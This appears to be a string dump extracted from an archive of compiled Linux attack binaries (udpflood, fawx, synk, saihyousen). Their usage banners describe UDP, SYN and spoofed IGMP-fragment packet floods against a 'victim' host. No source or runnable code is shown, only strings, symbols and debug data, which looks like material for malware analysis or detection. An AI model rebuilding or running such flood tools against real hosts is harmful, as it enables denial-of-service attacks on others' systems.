            "]U]U",
            "T]U]",
            "U\\WVE",
            "tahD",
            "EPEPEPEPh",
            "RE\u020bP",
            "RE\u020bP",
            "PE\u020bP",
            "j$EPEP",
            "EDt&",
            "e^_]US",
            "\u0403;u]]U]S",
            "31337890Saihyousen, by Noc-Wage",
            "The faster your connection to the internet is (latency",
            "wise, not bandwidth)",
            "and the lower the CPU speed of the victim",
            "will",
            "increase probability of success",
            "usage: %s victim num_of_packets Ex: saihyousen",
            "127.0.0.1 40000",
            "requires RAW SOCKETS",
            "setsockopt IP_HDRINCL",
            "%i.%i.%i.%i",
            "can't resolve destination hostname",
            "sendto",
            "Attack against %s finished",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "datapool/bin/udpflood",
            "0100755",
            "0000000",
            "0000000",
            "00000032271",
            "07100656731",
            "013704",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhd",
            "QVhp",
            "UPWVE",
            "EEPh",
            "u#h@",
            "u#h`",
            "fE\u0603j",
            "EP }",
            "E;E|",
            "j&EPEP",
            "EPh\u068a",
            "e^_]",
            "\u0403;u[]",
            "1234567890",
            "usage: %s sourcename destinationname numpackets",
            "Will flood %d times",
            "can't resolve source hostname",
            "can't resolve destination hostname",
            "socket",
            "We have IP_HDRINCL ",
            "setsockopt IP_HDRINCL",
            "Number of Packets sent:",
            "sendto",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "udpflood.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/fawx",
            "0100755",
            "0000000",
            "0000000",
            "00000033714",
            "07100656601",
            "013034",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "malloc",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U$Sj$",
            "EEEE",
            "Ej$j",
            "UMfY",
            "UMfY",
            "j$EPE",
            "P1 u",
            "EEEPj",
            "GEPEPEP$",
            "u\"h@",
            "E\ub703hc",
            "\u0403;u[]",
            " -----------------------------------------------",
            "| fawx v1 by ben-z: igmp-8+frag spoofing attack |",
            "[**] syntax: %s <spoof host> <target host> <number>",
            "uhm.. %s doesnt exist :P",
            "error opening raw socket. <got root?>",
            "[**] sending igmp-8+frag attacks to: %s.",
            "error sending packet. <got root?>",
            " *eof*",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "fawx.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "send_fawx",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/synk",
            "0100755",
            "0000000",
            "0000000",
            "00000036371",
            "07101434224",
            "013051",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "memcpy",
            "perror",
            "socket",
            "fflush",
            "fprintf",
            "__deregister_frame_info",
            "rand",
            "htonl",
            "sendto",
            "gettimeofday",
            "memset",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "P }-h",
            "fEfE9",
            "M@eM",
            "l1fR",
            "fEfE",
            "E1f8",
            "fE\u03031fEP",
            "fE\u0383h9H7(",
            "eeee\u07c0e?h",
            "fEfE",
            "EPEP*",
            ":H7(",
            "E\u070bU)\u0449M}",
            "E;Er",
            "EEE;Ev",
            "1fEPEPEP",
            "E@MA\u0449Mu'h",
            "\u0403;u[]",
            "Unknown host %s",
            "Error sending syn packet.",
            "Usage: %s srcaddr dstaddr low high num",
            "socket (raw)",
            "socket",
            "flooding. each dot equals 25 packets.",
            "Flood completed.",
            "High port must be greater than Low port.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
